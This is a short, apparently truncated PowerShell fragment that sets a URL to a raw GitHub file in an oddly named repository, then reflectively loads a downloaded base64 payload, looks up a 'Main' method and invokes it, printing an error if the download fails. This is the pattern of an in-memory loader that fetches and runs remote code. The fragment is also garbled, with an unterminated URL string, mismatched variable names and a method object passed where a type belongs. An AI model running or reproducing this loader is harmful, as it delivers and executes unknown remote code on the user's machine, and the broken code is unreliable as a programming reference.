

$url = "https://raw.githubusercontent.com/HeadShotXx/dxdasaxdsacdsadsacdsxdasacdaxsdcsdaxsadaxdscsa
    $class = $asseclass.GetMethod("Main")

    $instance = [System.Activator]::CreateInstance($class)
    $method.Invoke($instance, @())

} else {
    Write-Host "Failed to download base64String. Status code: $($response.StatusCode)"
}
